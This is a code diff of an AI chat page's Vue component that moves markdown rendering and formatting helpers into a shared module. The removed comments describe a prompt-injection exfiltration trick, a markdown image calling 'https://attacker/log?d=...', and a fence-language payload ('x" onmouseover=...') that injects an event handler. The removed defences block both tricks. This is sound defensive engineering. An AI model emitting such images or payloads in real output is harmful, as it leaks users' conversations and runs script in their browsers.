@@ -13,7 +13,7 @@ import {
   aiAsk, aiAskStream, aiFeedback, listAiModels, listConversations, createConversation, updateConversation,
   deleteConversation, batchDeleteConversations, listMessages
 , generateImage, createVideo, videoStatus } from '../api/ai'
-import MarkdownIt from 'markdown-it'
+import { useMarkdownView } from '../features/ai/useMarkdownView'
 import { useRouter } from 'vue-router'
 import { runLocalAgent } from '../utils/localAgent'
 import { createMyDoc, updateMyDoc, listMyDocs } from '../api/kb'
@@ -183,10 +183,6 @@ async function submitRate(m, rating, reason) {
     fbBusy[m.qaId] = false
   }
 }
-function fmtMs(ms) {
-  if (!ms) return ''
-  return ms >= 1000 ? (ms / 1000).toFixed(2) + 's' : ms + 'ms'
-}
 function onModelChange() {
   // 只影响后续提问：切换模型不会改写已有回答（历史回答保留当时的模型与耗时）
   ElMessage.info(selectedModelId.value ? '下一句将使用所选模型' : '下一句将使用默认模型')
@@ -310,19 +306,6 @@ function pickModel(id) {
   selectedModelId.value = id
   onModelChange()
 }
-function fmtTokens(u) {
-  if (!u) return ''
-  // OpenAI 兼容格式：prompt_tokens / completion_tokens / total_tokens
-  const inp = u.prompt_tokens ?? u.promptTokens ?? u.input_tokens
-  const out = u.completion_tokens ?? u.completionTokens ?? u.output_tokens
-  const total = u.total_tokens ?? u.totalTokens
-  if (total == null && inp == null && out == null) return ''
-  const t = total != null ? total : ((inp || 0) + (out || 0))
-  let s = t + ' tokens'
-  if (inp != null || out != null) s += `（输入 ${inp || 0} / 输出 ${out || 0}）`
-  return s
-}
-
 const showScrollBtn = ref(false)
 // 分段滑块位置：必须与按钮个数同步（kb=0 / general=1 / agent=2），
 // 之前只算了 2 个位置，加了 Agent 按钮后遮罩就错位了。
@@ -1018,7 +1001,6 @@ async function submitInstructions() {
   } catch { ElMessage.error('保存失败') } finally { savingInstructions.value = false }
 }
 
-function openSource(id) { if (id != null) window.open('/reader/' + id, '_blank') }
 // ---------- 附件：本地解析（图片走内置 OCR、文本文件直读），随提问注入 ----------
 function pickFiles() { fileInput.value?.click() }
 
@@ -1108,45 +1090,16 @@ async function copyAnswer(m) {
   catch { ElMessage.warning('复制失败，请手动选择') }
 }
 
-// ---------- Markdown（markdown-it + Prism 语法高亮，均在 node_modules，无需额外安装） ----------
-// html:false 防 XSS（AI 输出按纯文本解析）；linkify 自动识别裸链接；breaks 单换行即 <br> 贴合聊天排版
-const md = new MarkdownIt({ html: false, linkify: true, breaks: true })
-// 外部图片不自动加载：markdown 的 ![](https://attacker/log?d=...) 会被浏览器自动请求，
-// 被注入的对话内容可能借此外泄（外部复审 2026-10-07）。只放行本站 /uploads /emojis，
-// 其余降级为纯文本链接（点击才会访问）。
-const LOCAL_IMG_RE = /^\/(uploads|emojis)\//i
-const defaultRenderImage = md.renderer.rules.image
-md.renderer.rules.image = (tokens, idx, opts, env, self) => {
-  const src = tokens[idx].attrGet('src') || ''
-  if (LOCAL_IMG_RE.test(src) || /^(data:image\/(png|jpe?g|gif|webp|bmp);base64,)/i.test(src)) {
-    return defaultRenderImage(tokens, idx, opts, env, self)
-  }
-  const href = md.utils.escapeHtml(src)
-  return '<a href="' + href + '" target="_blank" rel="noopener noreferrer">[外部图片，点击查看]</a>'
-}
-
-// 代码块保留原 .md-code-block / .md-copy-btn / .md-code 结构，复用既有复制逻辑与样式；指定语言时用 Prism 上色
+// ---------- Markdown 渲染：共用模块 + 本端注入 Prism 高亮器 ----------
 function highlightCode(code, lang) {
   const l = (lang || '').toLowerCase()
   if (l && Prism.languages[l]) {
     try { return Prism.highlight(code, Prism.languages[l], l) } catch (e) { /* 语言不可用则回退纯文本 */ }
   }
-  return md.utils.escapeHtml(code)
+  return escapeHtml(code)
 }
-md.renderer.rules.fence = (tokens, idx) => {
-  const info = (tokens[idx].info || '').trim()
-  // 语言标识进 class 前必须做字符白名单（审查 r9 Critical / r10 复现）：
-  // 模型输出（可被检索内容提示注入）写 ```x" onmouseover=... 即可闭合属性注入事件处理器
-  const lang = info ? info.toLowerCase().split(/[\s,;:]/)[0].replace(/[^a-z0-9_+#.-]/g, '') : ''
-  const cls = lang ? ' language-' + lang : ''
-  const code = highlightCode(tokens[idx].content, lang)
-  return '<div class="md-code-block"><button type="button" class="md-copy-btn">复制</button>'
-    + '<pre class="md-code' + cls + '"><code' + cls + '>' + code + '</code></pre></div>'
-}
-function renderMarkdown(src) {
-  if (!src) return ''
-  return md.render(src)
-}
+const { renderMarkdown, fmtMs, fmtTokens, openSource } = useMarkdownView({ highlight: highlightCode })
+
 function onBodyClick(e) {
   const btn = e.target.closest?.('.md-copy-btn')
   if (!btn) return
